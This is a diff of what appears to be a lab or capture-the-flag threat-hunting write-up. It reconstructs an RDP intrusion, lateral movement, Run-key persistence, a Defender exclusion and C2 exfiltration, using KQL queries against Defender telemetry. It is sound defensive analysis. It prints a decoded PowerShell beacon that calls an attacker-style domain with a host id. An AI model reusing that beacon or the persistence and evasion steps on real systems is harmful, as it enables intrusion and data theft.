@@ -25,25 +25,134 @@ This writeup documents the reconstruction of the full intrusion chain using KQL 
 ### 1. Initial Access
 The real access vector to `npt-srv01` was a clean external RDP (`RemoteInteractive`) logon authenticated via Negotiate/NTLM from a single external IP (`148.64.103.173`) — not a pivot from inside the network, and not the brute-force noise that dominated the logs.
 
+```kql
+DeviceLogonEvents
+| where DeviceName == "npt-srv01"
+| where ActionType == "LogonSuccess"
+| where isnotempty(RemoteIP)
+| project Timestamp, AccountName, LogonType, Protocol, RemoteIP, RemoteDeviceName, ActionType
+| order by Timestamp asc
+```
+
 ### 2. Linux Recon & Tooling
-On `npt-linux01`, the operator:
-- Ran standard privilege enumeration (`sudo -l`), fumbling it once (`sudo -1`) before the correct command six minutes later.
-- Tested Windows-host reachability using bash's built-in `/dev/tcp` pseudo-device — no scanner dropped on the box — confirming RDP (port 3389) was open on both Windows targets.
-- Committed to installing **NetExec** (via `pipx`), pulling in `impacket`, `Certipy`, `oscrypto`, and `NfsClient` as dependencies.
+On `npt-linux01`, the operator ran standard privilege enumeration (`sudo -l`), fumbling it once (`sudo -1`) before the correct command six minutes later:
+
+```kql
+DeviceProcessEvents
+| where DeviceName == "npt-linux01"
+| where AccountName == "sancadmin"
+| project Timestamp, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
+
+They tested Windows-host reachability using bash's built-in `/dev/tcp` pseudo-device — no scanner dropped on the box — confirming RDP (port 3389) was open on both Windows targets, then committed to installing **NetExec** (via `pipx`), pulling in `impacket`, `Certipy`, `oscrypto`, and `NfsClient` as dependencies:
+
+```kql
+DeviceProcessEvents
+| where DeviceName == "npt-linux01"
+| where AccountName == "sancadmin"
+| where Timestamp between (datetime(2026-06-16 22:16:52) .. datetime(2026-06-16 22:40:00))
+| project Timestamp, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
 
 ### 3. Pivot, Execution & Persistence
-- Lateral movement from Linux (`10.2.0.30`) to `npt-ws01` via SMB/NTLM using NetExec and the `sancadmin` account.
-- The operator's own hands-on-keyboard PowerShell sessions were distinguishable from Defender's automated diagnostic noise by parent process: `explorer.exe → powershell.exe` (human) vs. `senseir.exe / gc_worker.exe → powershell.exe` (automated MDE/Azure Guest Configuration chatter).
-- Persistence was planted via an `HKCU\...\CurrentVersion\Run` key (`NorthpeakSyncTray`) launching a disguised PowerShell script (`NorthpeakSyncTray.ps1`) on every logon, surviving reboots.
-- A narrow Windows Defender exclusion was added for the persistence path/process — not a wholesale disabling of AV, just enough to keep it quiet.
+Lateral movement from Linux (`10.2.0.30`) to `npt-ws01` via SMB/NTLM using NetExec and the `sancadmin` account:
+
+```kql
+DeviceLogonEvents
+| where DeviceName == "npt-ws01"
+| where ActionType == "LogonSuccess"
+| where RemoteIP startswith "10.2.0."
+| project Timestamp, AccountName, LogonType, Protocol, RemoteIP
+| order by Timestamp asc
+```
+
+The operator's own hands-on-keyboard PowerShell sessions were distinguishable from Defender's automated diagnostic noise by parent process — `explorer.exe → powershell.exe` (human) vs. `senseir.exe / gc_worker.exe → powershell.exe` (automated MDE/Azure Guest Configuration chatter):
+
+```kql
+DeviceProcessEvents
+| where DeviceName == "npt-ws01"
+| where FileName =~ "powershell.exe"
+| project Timestamp, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessCommandLine
+| order by Timestamp asc
+```
+
+Persistence was planted via an `HKCU\...\CurrentVersion\Run` key (`NorthpeakSyncTray`) launching a disguised PowerShell script (`NorthpeakSyncTray.ps1`) on every logon, surviving reboots:
+
+```kql
+DeviceRegistryEvents
+| where DeviceName == "npt-ws01"
+| where RegistryKey has_any ("Run", "RunOnce", "CurrentVersion\\Run")
+| project Timestamp, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessAccountName, InitiatingProcessCommandLine
+| order by Timestamp asc
+```
 
 ### 4. Command & Control
-The beacon used three look-alike subdomains under `sync-northpeak.com` (`status.`, `updates.`, `cdn.`), but the network sensor only ever recorded one of them, and even that connection failed. The other two only appear in process command-line telemetry (base64-encoded `-EncodedCommand` PowerShell), meaning the network view alone would have completely missed two-thirds of the C2 channel. The beacon's fixed ~38-second check-in interval confirmed it was a scheduled, automated loop — not manual operator activity.
+The beacon used three look-alike subdomains under `sync-northpeak.com` (`status.`, `updates.`, `cdn.`), but the network sensor only ever recorded one of them, and even that connection failed:
+
+```kql
+DeviceNetworkEvents
+| where DeviceName == "npt-ws01"
+| where RemoteUrl has "sync-northpeak"
+| project Timestamp, RemoteUrl, RemoteIP, ActionType, InitiatingProcessCommandLine
+| order by Timestamp asc
+```
+
+The other two only appear in process command-line telemetry — base64-encoded `-EncodedCommand` PowerShell — meaning the network view alone would have completely missed two-thirds of the C2 channel:
+
+```kql
+DeviceProcessEvents
+| where DeviceName == "npt-ws01"
+| where InitiatingProcessFileName == "explorer.exe" or InitiatingProcessFileName == "powershell.exe"
+| where ProcessCommandLine has "EncodedCommand"
+| project Timestamp, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
+
+Decoding the base64 payload (PowerShell `-EncodedCommand` is UTF-16LE):
+
+```python
+import base64
+print(base64.b64decode(encoded_command).decode('utf-16-le'))
+# -> Invoke-WebRequest -Uri "https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09" -UseBasicParsing -TimeoutSec 4
+```
+
+The beacon's fixed ~38-second check-in interval to the first domain confirmed it was a scheduled, automated loop — not manual operator activity.
 
 ### 5. Impact & Judgment
-- A file (`customer_data_export_20260616.csv`) was staged in `C:\Temp` on `npt-srv01` and uploaded to `cdn.sync-northpeak.com` within 17 seconds of creation.
-- The exfil occurred during a **second, distinct RDP session** — the operator had disconnected and reconnected (fresh `RemoteInteractive` logon + `Unlock` event) roughly two hours after the original session, from the same external IP.
-- Most notably: across the entire multi-hour intrusion, there was **no tampering with the security stack** — no disabled real-time protection, no stopped services, no dropped tooling. Everything was living-off-the-land (native binaries, `pip`-installed public tools) run under a single legitimate, already-trusted admin account. That's why nothing tripped for hours: the account itself was the vulnerability, not any exploit or malware.
+A file (`customer_data_export_20260616.csv`) was staged in `C:\Temp` on `npt-srv01` and uploaded to `cdn.sync-northpeak.com` within 17 seconds of creation:
+
+```kql
+DeviceFileEvents
+| where DeviceName == "npt-srv01"
+| where InitiatingProcessAccountName == "sancadmin"
+| project Timestamp, FileName, FolderPath, ActionType, InitiatingProcessCommandLine
+| order by Timestamp asc
+```
+
+The exfil occurred during a **second, distinct RDP session** — the operator had disconnected and reconnected (fresh `RemoteInteractive` logon + `Unlock` event) roughly two hours after the original session, from the same external IP:
+
+```kql
+DeviceLogonEvents
+| where DeviceName == "npt-srv01"
+| where LogonType in ("RemoteInteractive", "Unlock")
+| where ActionType == "LogonSuccess"
+| project Timestamp, ActionType, LogonType, RemoteIP, AccountName
+| order by Timestamp asc
+```
+
+Most notably: across the entire multi-hour intrusion, there was **no tampering with the security stack** — checked directly against Defender/tamper-protection registry activity:
+
+```kql
+DeviceRegistryEvents
+| where DeviceName in ("npt-srv01", "npt-ws01")
+| where RegistryKey has_any ("Defender", "Windows Defender", "Tamper")
+| project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessAccountName
+| order by Timestamp asc
+```
+
+This returned only Defender's own routine platform-update noise (`IsServiceRunning: 1` throughout — it never stopped) plus a single narrow exclusion added for the persistence path/process — not a wholesale disabling of AV, just enough to keep it quiet. Everything else was living-off-the-land (native binaries, `pip`-installed public tools) run under a single legitimate, already-trusted admin account. That's why nothing tripped for hours: the account itself was the vulnerability, not any exploit or malware.
 
 ## Intrusion Chain Summary
 
